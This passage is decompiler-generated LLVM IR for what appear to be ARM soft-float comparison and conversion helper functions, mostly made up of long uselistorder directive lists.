  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_18724 = phi i32 [ %v2_18724.pre, %.thread..thread1_crit_edge ], [ %v1_1871c, %bb10 ]
  %v5_18724 = icmp eq i32 %v2_18724, %v0_18718
  br i1 %v5_18724, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1872c = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1872c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1872c, i32 %v0_1872c)
  %v0_18730 = load i32, i32* %r0.global-to-local, align 4
  %v0_18734 = load i32, i32* @r1, align 4
  %v1_18734 = load i32, i32* @r3, align 4
  %v2_18734 = xor i32 %v1_18734, %v0_18734
  %v3_18734 = icmp slt i32 %v2_18734, 0
  br i1 %v3_18734, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_18738 = icmp eq i32 %v0_18734, %v1_18734
  br i1 %v10_18738, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1873c = load i32, i32* @r2, align 4
  %v4_1873c = icmp ult i32 %v0_18730, %v2_1873c
  br i1 %v4_1873c, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_18738 = icmp ult i32 %v0_18734, %v1_18734
  br i1 %v4_18738, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_18734, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_18740 = and i32 %v1_18734, 1073741824
  %v3_18740 = icmp eq i32 %v2_18740, 0
  %v4_18740 = ashr i32 %v1_18734, 31
  br i1 %v3_18740, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_18744.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_18740, %bb15 ]
  %v5_18744 = sub nsw i32 -1, %v4_18744.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_18748 = phi i32 [ %v5_18744, %.thread3 ], [ %v4_18740, %bb15 ]
  %v1_18748 = or i32 %v0_18748, 1
  store i32 %v1_18748, i32* %r0.global-to-local, align 4
  ret i32 %v1_18748

dec_label_pc_18750:                               ; preds = %bb
  br label %dec_label_pc_18764

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18700
  %v0_1875c = load i32, i32* %r0.global-to-local, align 4
  %v4_1875c = mul i32 %v0_18704, 4096
  %v5_1875c = or i32 %v0_1875c, %v4_1875c
  store i32 %v5_1875c, i32* @ip, align 4
  %v7_1875c = icmp eq i32 %v5_1875c, 0
  br i1 %v7_1875c, label %dec_label_pc_1875c.dec_label_pc_18764_crit_edge, label %dec_label_pc_18778

dec_label_pc_1875c.dec_label_pc_18764_crit_edge:  ; preds = %dec_label_pc_1875c
  %v2_1870c.off20 = add i32 %v2_1870c, 4194303
  %tmp22 = icmp ult i32 %v2_1870c.off20, 2097152
  br label %dec_label_pc_18764

dec_label_pc_18764:                               ; preds = %dec_label_pc_1875c.dec_label_pc_18764_crit_edge, %dec_label_pc_18750
  %v3_18768.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1875c.dec_label_pc_18764_crit_edge ], [ true, %dec_label_pc_18750 ]
  br i1 %v3_18768.pre-phi, label %dec_label_pc_18770, label %dec_label_pc_18718

dec_label_pc_18770:                               ; preds = %dec_label_pc_18764
  %v0_18770 = load i32, i32* @r2, align 4
  %v4_18770 = mul i32 %v0_1870c, 4096
  %v5_18770 = or i32 %v0_18770, %v4_18770
  store i32 %v5_18770, i32* @ip, align 4
  %v7_18770 = icmp eq i32 %v5_18770, 0
  br i1 %v7_18770, label %dec_label_pc_18718, label %dec_label_pc_18778

dec_label_pc_18778:                               ; preds = %dec_label_pc_1875c, %dec_label_pc_18770
  store i32 %v0_18700, i32* %r0.global-to-local, align 4
  ret i32 %v0_18700

; uselistorder directives
  uselistorder i32 %v1_18734, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_18734, { 2, 1, 0 }
  uselistorder i32 %v1_1871c, { 1, 0 }
  uselistorder i32 %v2_1870c, { 0, 2, 1 }
  uselistorder i32 %v0_1870c, { 1, 0, 2 }
  uselistorder i32 %v2_18704, { 1, 0 }
  uselistorder i32 %v0_18704, { 1, 0, 2 }
  uselistorder i32 %v0_18700, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 1073741824, { 2, 3, 1, 4, 0 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 11, 7, 8, 1, 13, 0, 14, 15, 16, 17, 12 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 1, 2, 3, 4, 35, 36, 37, 38, 39, 40, 41, 42, 43, 14, 15, 16, 17, 18, 20, 44, 6, 57, 47, 45, 8, 13, 62, 67, 65, 66, 64, 58, 59, 11, 12, 60, 61, 63, 48, 49, 19, 51, 7, 52, 9, 46, 5, 50, 53, 54, 55, 10, 56 }
  uselistorder i32* @r3, { 61, 62, 10, 63, 64, 65, 11, 12, 66, 67, 9, 68, 69, 70, 71, 72, 73, 74, 75, 76, 35, 36, 38, 39, 40, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 3, 56, 8, 14, 37, 15, 16, 58, 59, 112, 113, 114, 115, 116, 117, 118, 5, 119, 120, 121, 6, 122, 123, 124, 7, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 0, 143, 144, 145, 146, 4, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 13, 147, 148, 149, 150, 154, 155, 156, 153, 42, 43, 44, 94, 95, 96, 89, 107, 108, 17, 18, 19, 160, 157, 158, 159, 2, 161, 162, 163, 90, 91, 100, 20, 101, 102, 103, 104, 25, 92, 26, 93, 105, 151, 97, 98, 99, 152, 109, 110, 111, 1, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 60, 106 }
  uselistorder i32* @r1, { 115, 116, 22, 117, 118, 119, 120, 121, 122, 12, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 24, 25, 26, 27, 28, 134, 1, 135, 136, 137, 138, 139, 140, 141, 11, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 29, 60, 61, 62, 66, 16, 20, 67, 68, 69, 70, 71, 72, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 8, 30, 31, 33, 32, 91, 92, 185, 153, 35, 36, 64, 93, 94, 100, 101, 63, 39, 186, 154, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 14, 65, 0, 34, 37, 15, 197, 38, 198, 199, 73, 74, 75, 55, 2, 187, 81, 82, 3, 4, 102, 103, 188, 189, 190, 172, 173, 174, 23, 18, 95, 96, 97, 98, 99, 5, 104, 105, 9, 106, 107, 108, 6, 21, 7, 175, 176, 177, 178, 179, 10, 180, 181, 182, 17, 191, 192, 183, 51, 184, 13, 155, 19, 195, 196, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 56, 57, 58, 59, 109, 110, 111, 112, 113, 114, 193, 194 }
  uselistorder i32* @ip, { 101, 102, 103, 104, 105, 106, 15, 16, 107, 108, 109, 110, 111, 112, 17, 113, 114, 115, 116, 117, 118, 119, 120, 27, 28, 29, 30, 31, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 55, 1, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 73, 76, 10, 77, 11, 78, 79, 80, 81, 121, 122, 2, 123, 18, 39, 82, 83, 84, 98, 174, 34, 35, 14, 125, 124, 6, 126, 127, 7, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 12, 208, 209, 210, 211, 212, 213, 214, 215, 216, 36, 128, 129, 130, 131, 132, 217, 218, 24, 48, 49, 3, 50, 51, 52, 53, 54, 173, 155, 156, 157, 158, 13, 159, 160, 161, 56, 57, 58, 59, 60, 61, 162, 163, 99, 164, 165, 133, 32, 33, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 135, 134, 8, 222, 219, 220, 221, 9, 223, 166, 0, 19, 167, 4, 168, 20, 5, 21, 137, 138, 139, 140, 141, 142, 143, 144, 136, 145, 146, 147, 148, 149, 150, 151, 152, 169, 170, 171, 22, 23, 153, 25, 26, 100, 154, 172 }
  uselistorder label %dec_label_pc_18778, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_18718, { 1, 0, 2 }
}

define i32 @function_18780() local_unnamed_addr {
dec_label_pc_18780:
  %v0_18784 = load i32, i32* @r2, align 4
  store i32 %v0_18784, i32* @r0, align 4
  %v0_18798 = call i32 @function_1879c()
  ret i32 %v0_18798

; uselistorder directives
  uselistorder i32* @r2, { 133, 134, 135, 2, 136, 13, 137, 138, 139, 140, 141, 142, 11, 143, 144, 145, 146, 147, 93, 94, 98, 14, 100, 101, 102, 103, 104, 109, 110, 111, 112, 113, 114, 115, 16, 116, 117, 118, 148, 149, 17, 99, 97, 119, 120, 121, 15, 18, 9, 184, 185, 186, 150, 151, 152, 153, 154, 155, 156, 157, 95, 96, 187, 188, 189, 190, 191, 195, 196, 197, 198, 1, 201, 192, 193, 105, 106, 194, 3, 4, 107, 108, 5, 6, 176, 158, 159, 160, 161, 19, 10, 122, 8, 0, 199, 7, 200, 162, 163, 164, 166, 165, 167, 168, 169, 170, 177, 178, 179, 171, 30, 172, 180, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 12, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 123, 124, 125, 126, 127, 128, 129, 130, 131, 174, 175, 181, 182, 183, 132, 173 }
}

define i32 @function_1879c() local_unnamed_addr {
dec_label_pc_1879c:
  %stack_var_-8 = alloca i32, align 4
  %v3_1879c = load i32, i32* @r0, align 4
  store i32 %v3_1879c, i32* %stack_var_-8, align 4
  %v0_187a0 = call i32 @function_186fc()
  store i1 true, i1* @cpsr_c, align 1
  %v1_187a4 = icmp slt i32 %v0_187a0, 0
  %v2_187a4 = icmp eq i32 %v0_187a0, 0
  store i1 %v2_187a4, i1* @cpsr_z, align 1
  br i1 %v1_187a4, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_1879c
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1879c, %bb
  %v2_187ac = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_187ac

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_187b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_187b4:
  %v0_187b8 = call i32 @function_1879c()
  %v0_187bc = load i1, i1* @cpsr_z, align 1
  %.v0_187b8. = zext i1 %v0_187bc to i32
  ret i32 %.v0_187b8.
}

define i32 @function_187cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_187cc:
  %v0_187d0 = call i32 @function_1879c()
  %v0_187d4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_187d4 to i32
  %.v0_187d0. = xor i32 %tmp2, 1
  ret i32 %.v0_187d0.
}

define i32 @function_187e4() local_unnamed_addr {
dec_label_pc_187e4:
  %v0_187e8 = call i32 @function_1879c()
  %v0_187ec = load i1, i1* @cpsr_z, align 1
  %v1_187ec = load i1, i1* @cpsr_c, align 1
  %v2_187ec = xor i1 %v1_187ec, true
  %v3_187ec = or i1 %v0_187ec, %v2_187ec
  %.v0_187e8 = select i1 %v3_187ec, i32 1, i32 %v0_187e8
  %v2_187f0 = xor i1 %v0_187ec, true
  %v3_187f0 = and i1 %v1_187ec, %v2_187f0
  %..v0_187e8 = select i1 %v3_187f0, i32 0, i32 %.v0_187e8
  ret i32 %..v0_187e8

; uselistorder directives
  uselistorder i1 %v1_187ec, { 1, 0 }
  uselistorder i32 ()* @function_1879c, { 2, 1, 0, 3 }
}

define i32 @function_187fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_187fc:
  %stack_var_-8 = alloca i32, align 4
  %v0_187fc = load i32, i32* @lr, align 4
  store i32 %v0_187fc, i32* %stack_var_-8, align 4
  %v0_18800 = call i32 @function_18780()
  %v0_18804 = load i1, i1* @cpsr_z, align 1
  %v1_18804 = load i1, i1* @cpsr_c, align 1
  %v2_18804 = xor i1 %v1_18804, true
  %v3_18804 = or i1 %v0_18804, %v2_18804
  %.v0_18800 = select i1 %v3_18804, i32 1, i32 %v0_18800
  %v2_18808 = xor i1 %v0_18804, true
  %v3_18808 = and i1 %v1_18804, %v2_18808
  %..v0_18800 = select i1 %v3_18808, i32 0, i32 %.v0_18800
  %v2_1880c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1880c, i32* @lr, align 4
  ret i32 %..v0_18800

; uselistorder directives
  uselistorder i1 %v1_18804, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 97, 0, 87, 6, 7, 8, 9, 10, 11, 79, 80, 88, 89, 81, 12, 13, 14, 82, 83, 84, 90, 16, 15, 98, 99, 100, 101, 102, 103, 104, 85, 105, 106, 107, 92, 108, 109, 110, 111, 86, 112, 113, 114, 115, 116, 117, 118, 17, 119, 96, 120, 18, 19, 20, 21, 93, 24, 25, 26, 27, 22, 23, 94, 28, 29, 95, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 121, 122, 123, 124, 56, 57, 91, 125, 58, 59, 126, 60, 61, 1, 62, 63, 77, 64, 65, 66, 67, 78, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i1* @cpsr_z, { 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 49, 11, 12, 13, 14, 15, 16, 17, 18, 45, 46, 47, 48, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 44 }
  uselistorder i32* @lr, { 102, 103, 104, 105, 106, 107, 108, 109, 5, 6, 7, 8, 110, 0, 111, 1, 112, 113, 114, 115, 116, 117, 44, 45, 49, 50, 51, 55, 56, 57, 59, 60, 61, 62, 63, 65, 4, 69, 70, 71, 72, 73, 74, 75, 76, 77, 9, 10, 78, 79, 80, 88, 81, 82, 83, 84, 85, 86, 87, 118, 58, 11, 12, 52, 53, 54, 19, 170, 171, 172, 173, 174, 175, 176, 177, 178, 141, 142, 46, 47, 48, 119, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 43, 13, 14, 25, 26, 27, 37, 38, 64, 39, 40, 41, 15, 16, 166, 179, 180, 17, 18, 143, 144, 145, 146, 147, 148, 66, 67, 68, 149, 150, 151, 152, 153, 154, 155, 2, 156, 157, 159, 160, 158, 89, 90, 20, 21, 22, 91, 92, 93, 161, 162, 163, 132, 133, 134, 135, 3, 136, 137, 138, 139, 28, 29, 30, 31, 32, 33, 34, 164, 165, 35, 120, 121, 167, 168, 169, 23, 24, 36, 42, 94, 95, 96, 97, 98, 99, 100, 101, 140 }
}

define i32 @function_18814() local_unnamed_addr {
dec_label_pc_18814:
  %v0_18818 = call i32 @function_18780()
  %v0_1881c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1881c to i32
  %.v0_18818. = xor i32 %tmp2, 1
  ret i32 %.v0_18818.

; uselistorder directives
  uselistorder i32 1, { 552, 564, 658, 565, 553, 659, 1190, 251, 1191, 945, 1192, 660, 327, 332, 331, 329, 328, 330, 326, 333, 1193, 661, 1194, 662, 141, 142, 139, 140, 417, 418, 419, 516, 313, 663, 439, 440, 1195, 1196, 23, 22, 1197, 446, 447, 448, 664, 371, 372, 1049, 572, 1050, 1051, 665, 27, 28, 29, 24, 25, 26, 30, 666, 226, 225, 1052, 573, 574, 1055, 1069, 669, 668, 667, 436, 438, 435, 437, 1071, 670, 360, 361, 1072, 517, 1073, 1074, 671, 31, 32, 353, 352, 247, 672, 306, 305, 1075, 674, 673, 291, 290, 289, 675, 300, 676, 203, 575, 1076, 1077, 1078, 493, 1079, 558, 518, 1080, 1081, 495, 1082, 1083, 679, 678, 677, 394, 396, 397, 395, 1084, 1085, 1086, 1092, 1093, 1094, 1101, 576, 577, 654, 686, 685, 655, 684, 683, 682, 681, 680, 398, 401, 400, 399, 1104, 687, 21, 18, 20, 19, 554, 1105, 1106, 545, 1107, 1109, 470, 1111, 579, 540, 539, 578, 1112, 488, 503, 538, 559, 1113, 1114, 1115, 1116, 1117, 0, 1118, 1108, 580, 1119, 549, 695, 645, 694, 693, 692, 691, 690, 689, 688, 180, 179, 178, 181, 1120, 1121, 1122, 1123, 1124, 471, 1125, 696, 208, 211, 207, 205, 204, 206, 209, 210, 946, 947, 948, 949, 950, 951, 952, 953, 519, 954, 955, 700, 699, 698, 697, 197, 198, 199, 200, 956, 957, 958, 959, 960, 703, 702, 701, 268, 264, 265, 270, 267, 266, 272, 271, 269, 520, 1126, 521, 1127, 1128, 1129, 1130, 1, 1131, 1132, 1133, 1134, 1135, 1136, 656, 704, 341, 340, 343, 344, 339, 345, 342, 566, 1137, 1138, 1139, 1140, 1141, 705, 218, 217, 219, 220, 221, 1263, 706, 412, 413, 414, 707, 261, 708, 148, 149, 151, 150, 709, 256, 255, 254, 1198, 1199, 1200, 710, 461, 463, 462, 459, 460, 711, 164, 165, 162, 168, 166, 163, 167, 712, 450, 455, 449, 454, 458, 457, 453, 456, 451, 452, 713, 202, 714, 304, 303, 216, 215, 522, 1142, 1143, 1162, 1163, 716, 715, 98, 100, 101, 99, 496, 546, 497, 1164, 1165, 1166, 1167, 523, 717, 169, 974, 975, 67, 68, 504, 1331, 505, 1056, 1332, 1057, 1058, 1059, 506, 976, 1061, 1060, 486, 718, 977, 719, 442, 443, 444, 441, 1201, 507, 1202, 1333, 508, 1334, 1335, 1336, 1337, 1338, 1339, 943, 1340, 1341, 1342, 1343, 1344, 1345, 944, 646, 721, 720, 89, 90, 92, 94, 93, 91, 88, 97, 95, 96, 581, 1264, 1265, 1266, 1267, 722, 647, 110, 109, 1062, 1063, 723, 293, 292, 509, 524, 1203, 1204, 1207, 582, 1208, 494, 525, 489, 510, 1209, 583, 1210, 1211, 1212, 2, 1213, 479, 1214, 472, 1215, 584, 1216, 1217, 1218, 526, 1219, 736, 735, 734, 733, 732, 731, 730, 729, 728, 727, 726, 725, 648, 724, 45, 52, 44, 46, 53, 42, 43, 48, 47, 55, 56, 50, 49, 51, 54, 1220, 1221, 76, 74, 79, 77, 78, 75, 80, 257, 490, 737, 195, 196, 738, 152, 1268, 1269, 1270, 739, 170, 171, 173, 172, 176, 177, 174, 175, 354, 1222, 741, 740, 133, 135, 134, 136, 138, 137, 527, 560, 744, 743, 742, 585, 1070, 745, 368, 1064, 1065, 1066, 1067, 1068, 586, 746, 69, 70, 73, 72, 71, 587, 66, 961, 747, 346, 588, 748, 367, 555, 589, 749, 299, 297, 298, 750, 224, 223, 222, 751, 262, 274, 752, 228, 227, 302, 753, 201, 754, 364, 363, 249, 248, 370, 369, 755, 756, 347, 348, 757, 253, 252, 758, 282, 281, 759, 312, 760, 387, 761, 309, 308, 762, 434, 763, 232, 764, 276, 277, 1346, 590, 1347, 591, 1348, 765, 62, 57, 63, 61, 59, 64, 58, 65, 60, 301, 592, 358, 357, 766, 415, 416, 1004, 1005, 769, 768, 767, 260, 189, 491, 962, 963, 964, 770, 1029, 773, 772, 771, 280, 774, 498, 1087, 499, 1088, 1089, 492, 1090, 404, 405, 403, 406, 407, 409, 408, 1091, 500, 965, 37, 40, 39, 38, 41, 1031, 528, 529, 1032, 776, 775, 15, 13, 12, 16, 17, 14, 777, 106, 108, 104, 102, 103, 105, 107, 778, 362, 779, 780, 182, 183, 781, 238, 782, 1349, 530, 561, 784, 783, 785, 359, 1271, 1274, 1275, 1276, 786, 379, 384, 385, 383, 382, 386, 380, 381, 1277, 1278, 1279, 1280, 787, 425, 431, 424, 430, 429, 423, 433, 432, 427, 422, 426, 428, 1272, 1273, 593, 187, 186, 185, 188, 1095, 594, 1096, 1097, 1098, 1099, 1100, 788, 34, 35, 33, 36, 1281, 1282, 1283, 1284, 1285, 1286, 556, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 596, 1295, 1296, 1297, 1298, 1299, 595, 1300, 1301, 1302, 1303, 1304, 789, 316, 318, 314, 317, 321, 323, 320, 322, 324, 319, 325, 315, 230, 229, 790, 366, 365, 356, 791, 242, 792, 294, 793, 311, 310, 794, 258, 795, 284, 283, 796, 338, 797, 798, 1037, 1038, 1039, 480, 481, 1040, 800, 799, 421, 420, 1305, 801, 1110, 802, 259, 1223, 1224, 803, 402, 1053, 1054, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 804, 235, 233, 234, 236, 237, 1168, 1169, 250, 1170, 1171, 3, 1172, 4, 531, 5, 532, 6, 533, 1173, 1174, 7, 146, 147, 511, 1225, 1103, 1102, 1327, 1328, 966, 967, 968, 969, 970, 971, 972, 1350, 334, 335, 336, 337, 355, 597, 805, 598, 1175, 1176, 1177, 806, 649, 192, 193, 190, 194, 191, 1309, 1306, 1307, 1308, 541, 512, 157, 153, 154, 155, 156, 1310, 807, 159, 160, 161, 158, 599, 1311, 809, 808, 375, 378, 376, 373, 374, 377, 978, 810, 307, 1178, 1179, 811, 285, 288, 286, 287, 1312, 812, 145, 144, 143, 1006, 813, 113, 112, 114, 111, 550, 1226, 1227, 601, 1228, 1229, 1230, 1231, 1232, 602, 1233, 1234, 1235, 1236, 1237, 603, 1239, 535, 534, 1238, 600, 1240, 1241, 604, 1242, 1243, 1244, 818, 657, 817, 816, 815, 814, 118, 116, 117, 120, 123, 115, 125, 121, 124, 122, 119, 1245, 819, 389, 393, 391, 392, 388, 390, 513, 820, 212, 213, 1246, 1247, 1248, 128, 129, 126, 127, 551, 482, 1250, 1251, 501, 1252, 1253, 8, 9, 1254, 1256, 487, 1257, 606, 1258, 502, 1255, 605, 830, 829, 828, 827, 826, 825, 824, 823, 822, 821, 130, 131, 132, 607, 514, 831, 239, 240, 241, 1249, 562, 650, 832, 410, 608, 973, 86, 87, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 515, 835, 834, 833, 465, 464, 468, 467, 466, 469, 609, 547, 548, 1007, 839, 838, 837, 836, 81, 84, 83, 85, 82, 840, 349, 536, 842, 841, 843, 1321, 1322, 1323, 845, 844, 350, 351, 846, 296, 295, 847, 278, 848, 244, 243, 849, 246, 245, 850, 214, 263, 851, 411, 852, 1205, 473, 1206, 474, 1329, 445, 979, 980, 981, 982, 983, 984, 613, 985, 986, 483, 611, 612, 987, 614, 988, 615, 989, 610, 990, 991, 860, 859, 858, 857, 856, 855, 854, 853, 275, 619, 616, 617, 618, 620, 621, 864, 863, 862, 861, 992, 993, 865, 866, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 867, 651, 868, 869, 231, 1008, 475, 484, 1009, 1010, 1011, 1012, 476, 1013, 1014, 1015, 1016, 1017, 622, 1018, 1025, 1026, 1027, 873, 872, 871, 870, 279, 874, 1028, 875, 876, 623, 624, 878, 877, 1030, 625, 626, 627, 628, 881, 880, 879, 1033, 629, 630, 631, 888, 652, 887, 886, 885, 884, 883, 882, 1034, 1035, 632, 633, 897, 896, 895, 653, 894, 893, 892, 891, 890, 889, 1036, 557, 634, 635, 902, 901, 900, 899, 898, 904, 903, 567, 1041, 477, 478, 1042, 1043, 1044, 909, 908, 907, 906, 905, 1045, 910, 1046, 911, 1047, 913, 912, 914, 1048, 915, 1180, 1181, 636, 1182, 1183, 1184, 637, 10, 1185, 638, 1186, 639, 923, 922, 921, 920, 919, 918, 917, 916, 184, 543, 485, 640, 542, 924, 563, 1187, 925, 641, 1259, 642, 1260, 643, 1261, 644, 1262, 934, 933, 932, 931, 930, 929, 928, 927, 926, 273, 1324, 1325, 1326, 936, 935, 937, 544, 1330, 537, 1188, 11, 1189, 938, 940, 939, 569, 1019, 1020, 568, 1021, 1022, 570, 571, 1023, 1024, 941, 942 }
  uselistorder i1 false, { 31, 34, 13, 14, 11, 15, 47, 48, 49, 50, 51, 52, 8, 9, 12, 53, 10, 35, 32, 36, 37, 38, 39, 40, 3, 16, 17, 33, 1, 29, 54, 0, 21, 22, 23, 41, 18, 20, 42, 43, 44, 45, 46, 30, 2, 4, 55, 19, 24, 5, 27, 26, 25, 28, 6, 7, 56, 57, 58, 59 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @function_18780, { 1, 0 }
}

define i32 @function_1882c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1882c:
  %v1_1882c = icmp slt i32 %arg2, 0
  %v2_1882c = mul i32 %arg2, 2
  br i1 %v1_1882c, label %dec_label_pc_18860, label %dec_label_pc_18834

dec_label_pc_18834:                               ; preds = %dec_label_pc_1882c
  %v1_18834 = add i32 %v2_1882c, 2097152
  %v2_18834 = icmp ugt i32 %v2_1882c, -2097153
  br i1 %v2_18834, label %dec_label_pc_18868, label %dec_label_pc_1883c

dec_label_pc_1883c:                               ; preds = %dec_label_pc_18834
  %v6_18834 = icmp slt i32 %v1_18834, 0
  br i1 %v6_18834, label %dec_label_pc_18840, label %dec_label_pc_18860

dec_label_pc_18840:                               ; preds = %dec_label_pc_1883c
  %v4_18844 = sdiv i32 %v1_18834, 2097152
  %v5_18844 = sub nsw i32 -993, %v4_18844
  %v11_18844 = icmp slt i32 %v5_18844, 0
  br i1 %v11_18844, label %dec_label_pc_18870, label %dec_label_pc_1884c

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18840
  %v3_1884c = mul i32 %arg2, 2048
  %v4_18854 = udiv i32 %arg1, 2097152
  %v1_18850 = or i32 %v4_18854, %v3_1884c
  %v5_18854 = or i32 %v1_18850, -2147483648
  %v6_18858 = lshr i32 %v5_18854, %v5_18844
  ret i32 %v6_18858

dec_label_pc_18860:                               ; preds = %dec_label_pc_1883c, %dec_label_pc_1882c
  ret i32 0

dec_label_pc_18868:                               ; preds = %dec_label_pc_18834
  %v4_18868 = mul i32 %arg2, 4096
  %v5_18868 = or i32 %v4_18868, %arg1
  %v7_18868 = icmp eq i32 %v5_18868, 0
  br i1 %v7_18868, label %dec_label_pc_18870, label %dec_label_pc_18878

dec_label_pc_18870:                               ; preds = %dec_label_pc_18868, %dec_label_pc_18840
  ret i32 -1

dec_label_pc_18878:                               ; preds = %dec_label_pc_18868
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 34, 237, 160, 161, 37, 38, 35, 36, 162, 39, 159, 163, 164, 165, 1, 166, 167, 2, 3, 74, 168, 75, 257, 143, 259, 76, 260, 133, 277, 261, 77, 316, 262, 4, 78, 263, 79, 264, 265, 169, 170, 130, 171, 139, 80, 5, 172, 268, 64, 65, 269, 173, 134, 174, 136, 175, 6, 176, 138, 137, 270, 271, 53, 54, 55, 56, 58, 66, 7, 8, 62, 238, 9, 10, 11, 82, 86, 81, 83, 128, 129, 87, 85, 84, 144, 239, 88, 317, 89, 278, 177, 279, 280, 241, 242, 243, 90, 244, 245, 91, 248, 12, 272, 273, 178, 40, 41, 42, 43, 281, 179, 72, 44, 180, 282, 45, 13, 46, 181, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 182, 318, 319, 183, 92, 283, 184, 185, 284, 285, 73, 67, 68, 286, 287, 288, 289, 290, 140, 93, 291, 141, 14, 158, 69, 70, 186, 292, 293, 294, 187, 145, 295, 296, 188, 15, 189, 297, 298, 146, 258, 190, 17, 16, 191, 192, 18, 247, 193, 94, 348, 95, 349, 96, 97, 254, 98, 321, 99, 246, 100, 350, 63, 322, 101, 240, 102, 250, 103, 351, 104, 105, 251, 106, 252, 107, 323, 324, 19, 194, 195, 196, 197, 325, 266, 267, 147, 108, 249, 61, 198, 20, 150, 149, 148, 199, 21, 200, 22, 201, 151, 326, 26, 202, 203, 25, 27, 327, 24, 204, 205, 47, 23, 206, 48, 49, 109, 299, 110, 111, 255, 112, 300, 113, 301, 114, 274, 115, 302, 116, 303, 60, 117, 304, 157, 207, 208, 209, 210, 211, 212, 213, 118, 156, 305, 119, 275, 214, 276, 215, 28, 216, 131, 120, 329, 217, 306, 218, 307, 308, 50, 309, 310, 71, 311, 219, 220, 132, 142, 135, 312, 29, 221, 152, 313, 222, 30, 51, 57, 59, 155, 52, 253, 314, 330, 331, 153, 121, 